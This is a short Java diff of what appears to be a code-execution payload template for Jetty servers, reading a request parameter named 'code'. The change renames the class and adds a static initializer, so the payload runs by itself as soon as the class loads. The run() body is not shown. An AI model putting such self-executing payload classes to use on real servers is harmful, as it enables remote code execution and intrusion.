@@ -5,13 +5,21 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
-public class JettyCodeExecTpl {
+public class CodeExec
+{
 
     private String getReqParamName() {
         return "code";
     }
 
-    public JettyCodeExecTpl() {
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
+    }
+
+    public CodeExec() {
         run();
     }
 
